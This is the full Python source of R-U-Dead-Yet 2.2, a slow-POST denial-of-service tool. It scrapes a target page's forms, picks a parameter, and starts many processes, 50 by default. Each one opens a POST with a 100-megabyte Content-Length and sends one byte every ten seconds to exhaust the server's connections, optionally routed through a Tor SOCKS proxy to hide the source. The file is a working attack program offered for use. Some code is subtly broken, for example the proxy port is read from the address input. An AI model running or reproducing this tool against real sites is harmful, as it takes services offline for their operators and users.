#!/usr/bin/env python
"""
    R-U-Dead-Yet version 2.2
    Copyright 2010-2011, Raviv Raz
    R-U-Dead-Yet is distributed under the terms of the GNU General Public License
    R-U-Dead-Yet is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""
from sys import argv
from multiprocessing import Process,Queue,freeze_support
from socks import socksocket,PROXY_TYPE_SOCKS4
import socket
from BeautifulSoup import BeautifulSoup
from urllib2 import urlopen
from urlparse import urljoin,urlparse
import re
from time import sleep
from ConfigParser import ConfigParser

class Parser():
    def __init__(self, _base_url, _html):
        self.base_url = _base_url
        self.html = _html
        self.description = ''
        self.i_links = []
        self.get_params = []
        self.get_actions = []
        self.get_values = []
        self.post_params = []
        self.post_actions = []
        self.post_values = []
        if (not self.parse_links()):
            return;                     
    def getForms(self):
        forms = {}
        for index in range(len(p.post_params)):
            if self.post_actions[index] in forms:
                if not self.post_params[index] in forms[self.post_actions[index]]:
                    forms[self.post_actions[index]].append(str(self.post_params[index]))
            else:
                forms[str(self.post_actions[index])] = [str(self.post_params[index])]
        return forms
    def parse_links(self):
        try :
            soup = BeautifulSoup(self.html.lower())
            self.fetchParams(soup)
            aTags = soup.findAll('a')
            for tag in aTags:
                if tag.has_key('href'):
                    link = urljoin(self.base_url, tag['href'])
                    link = re.sub('\?.*', '', link)
                    if self.isInternalLink(self.base_url, link) and not link in self.i_links:
                        self.i_links.append(link)
        except Exception, ex:
            print "Exception caught:", ex
            return False
        return True


    def stripHttp(self, url):
        if url.startswith('http://'):
            url = url[7:]
        elif url.startswith('https://'):
            url = url[8:]
        if url.startswith('www.'):
            url = url[4:]
        elif url.startswith('www2.'):
            url = url[5:]
        return url

    def getDomain(self, url):
        url = self.stripHttp(url)
        if url.find('/') > 0:
            url = url[:url.find('/')]
        return url

    def isInternalLink(self, base_url, url2):
        domain1 = self.getDomain(base_url)
        domain2 = self.getDomain(url2)
        return domain1 == domain2

    def fetchParams(self, soup_html):
        forms = soup_html.findAll('form')
        for form in forms:
            if form.has_key('action'):
                if form['action'].find('://') == -1:                        
                        action = self.base_url.strip('/') + "/" + form['action'].strip('/')
                else:
                        action = form['action'].strip('/')        
            else:
                action = self.base_url
            if form.has_key('method') and form['method'].lower() == 'post':
                for post_input in form.findAll("input"):                                    
                    if post_input.has_key('type'):
                        if post_input['type'].lower() == 'text' or \
                          post_input['type'].lower() == 'password' or \
                          post_input['type'].lower() == 'hidden'or \
                          post_input['type'].lower() == 'radio':
                            if post_input.has_key('id'):                                
                                self.post_params.append(post_input['id'])
                                self.post_actions.append(action)
                                if post_input.has_key('value'):
                                    self.post_values.append(post_input['value'])
                                else:
                                    self.post_values.append('')
                            elif post_input.has_key('name'):
                                self.post_params.append(post_input['name'])
                                self.post_actions.append(action)
                                if post_input.has_key('value'):
                                    self.post_values.append(post_input['value'])
                                else:
                                    self.post_values.append('')
                                
            else:
                for get_input in form.findAll("input"):                       
                    if get_input.has_key('type'):
                        if get_input['type'].lower() == 'text' or \
                          get_input['type'].lower() == 'password' or \
                          get_input['type'].lower() == 'hidden'or \
                          get_input['type'].lower() == 'radio':
                            if get_input.has_key('id'):
                                self.get_params.append(get_input['id'])
                                self.get_actions.append(action)
                                if get_input.has_key('value'):
                                    self.get_values.append(get_input['value'])
                                else:
                                    self.get_values.append('')
                            elif get_input.has_key('name'):
                                self.get_params.append(get_input['name'])
                                self.get_actions.append(action)
                                if get_input.has_key('value'):
                                    self.get_values.append(get_input['value'])
                                else:
                                    self.get_values.append('')

class connection:
    def __init__(self,host,port,headers,proxy_addr="",proxy_port=0):
        self.host = host
        self.port = port
        self.headers = headers
        self.proxy_addr = proxy_addr
        self.proxy_port = proxy_port
    def connect(self):
        if self.proxy_addr != "":
            self.s = socksocket()
            self.s.setproxy(PROXY_TYPE_SOCKS4,"127.0.0.1",9050)
        else:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.host,self.port))
        self.s.send(self.headers)
    def send(self,data):
        self.s.send(data)
    def close(self):
        self.s.close()

class Client(Process): 
    def __init__(self,host,port,headers,proxy_addr,proxy_port): 
        Process.__init__(self)
        self.host = host
        self.port = port
        self.headers = headers
        self.proxy_addr = proxy_addr
        self.proxy_port = proxy_port
    def run(self):
        c = connection(self.host,self.port,self.headers,self.proxy_addr,self.proxy_port)
        c.connect()
        while 1:
            c.send("A")
            sleep(10)

def readConf():
    cfg = ConfigParser()
    cfg.read("rudeadyet.conf")
    return cfg.get("parameters","URL"),int(cfg.get("parameters","number_of_connections")),cfg.get("parameters","attack_parameter"),cfg.get("parameters","proxy_addr"),int(cfg.get("parameters","proxy_port"))
if __name__ == "__main__":
    proxy_addr = ""
    proxy_port = 0
    proxy_on = False
    freeze_support()
    if len(argv) == 2:
        data = urlopen(argv[1])
        html = data.read()
        p = Parser(argv[1],html)
        u = 0
        while u < 1 or u > len(p.getForms().keys()):
            print "\nFound %i forms to submit. Please select number of form to use:\n"%len(p.getForms().keys())
            for url in p.getForms().keys():
                rel_url = str(url[len(argv[1]):])
                if rel_url == "":
                    rel_url = "/"
                if rel_url[0] == ".":
                    rel_url = rel_url[1:]
                base = re.findall("https?://[^/]+",argv[1])[0]
                printurl = base+rel_url
                print p.getForms().keys().index(url)+1,")",printurl
            try:
                u = int(raw_input("\n> "))
            except:
                pass
        base = re.findall("https?://[^/]+",argv[1])[0]
        attack_url = str(p.getForms().keys()[u-1][len(argv[1]):])
        if "." == attack_url[0]:
            attack_url = attack_url[1:]
        attack_url = base+attack_url
        params = p.getForms()[p.getForms().keys()[u-1]]
        p = 0
        while p < 1 or p > len(params):
            print "\nFound %i parameters to attack. Please select number of parameter to use:\n"%len(params)
            for param in params:
                print params.index(param)+1,")",param
            try:
                p = int(raw_input("\n> "))
            except:
                pass
        print "\nNumber of connections to spawn: (default=50)"
        num = raw_input("\n> ")
        if num == "":
            num_of_processes = 50
        else:
            num_of_processes = int(num)
        attack_parameter = params[p-1]
        useProxy = str(raw_input("\nUse SOCKS proxy? [yes/no] (Default=no)\n> "))
        if "y" in useProxy.lower():
            proxy_on = True
            proxy_addr = "127.0.0.1"
            proxy_port = 9050
            proxy_addr_input = str(raw_input("\nEnter proxy address: (Default=127.0.0.1)\n> ")).strip()
            if proxy_addr_input != "":
                proxy_addr = proxy_addr_input
            proxy_port_input = raw_input("\nEnter proxy port: (Default=9050)\n> ")
            if proxy_port_input != "":
                proxy_port = int(proxy_addr_input)
    else:
        print "[!] Using configuration file"
        try:
            attack_url,num_of_processes,attack_parameter,proxy_addr,proxy_port = readConf()
            if proxy_addr != "":
                proxy_on = True
        except:
            print "\n[x] No configuration file found.\nCreate rudeadyet.conf file or enter URL of page with form\n"
            raise SystemExit
    host = urlparse(attack_url)[1]
    if ":" in host:
        port = int(re.findall(":([0-9]+)",host)[0])
        print "[!] Using port %i"%port
        print "[!] Using address:",attack_url
        hostname = host[:host.find(":")]
    else:
    	port = 80
    	hostname = host
    data = urlopen(attack_url)
    path = urlparse(attack_url)[2]
    print "[!] Attacking:",attack_url
    print "[!] With parameter:",attack_parameter
    if proxy_on:
        print "[!] Using proxy server at",proxy_addr+":"+str(proxy_port)
    cookies = ""
    header_list = str(data.info()).split('\n')
    for header in header_list:
        if "Set-Cookie" in header: cookies += "Cookie: "+header[header.find("""Set-Cookie: """)+12:]+"\n"
    if cookies != "":
        headers = """\
POST %(path)s HTTP/1.1
Host: %(host)s
Connection: keep-alive
Content-Length: 100000000
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
%(cookies)s
%(param)s="""%{"path":path,"host":host,"cookies":cookies,"param":attack_parameter}
    else:
        headers = """\
POST %(path)s HTTP/1.1
Host: %(host)s
Connection: keep-alive
Content-Length: 100000000
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)

%(param)s="""%{"path":path,"host":host,"param":attack_parameter}
    q = Queue()
    for i in range(num_of_processes):
        p = Client(hostname,port,headers,proxy_addr,proxy_port).start()
        q.put(p,False)

